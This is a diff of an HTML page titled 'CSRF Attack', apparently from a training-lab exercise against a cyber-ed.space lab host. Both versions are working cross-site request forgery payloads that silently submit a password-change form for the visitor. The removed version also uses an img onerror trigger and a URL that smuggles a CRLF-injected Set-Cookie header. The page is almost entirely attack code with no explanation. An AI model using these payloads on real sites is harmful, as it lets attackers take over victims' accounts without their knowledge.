@@ -1,9 +1,15 @@
+<!DOCTYPE html>
 <html>
-<form action="https://web.wrzn11se9ah2h9obfbpi.labs.cyber-ed.space/main.php" method=POST>
-<input type="text" name="action" value="change_password">
-<input type="text" name="new_password" value="test1234">
-<input type=submit>
-</form>
-    <img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
-  </body>
+<head>
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <form action="https://web.wrzn11se9ah2h9obfbpi.labs.cyber-ed.space/main.php" method="POST">
+        <input type="hidden" name="action" value="change_password">
+        <input type="hidden" name="new_password" value="test">
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+</body>
 </html>
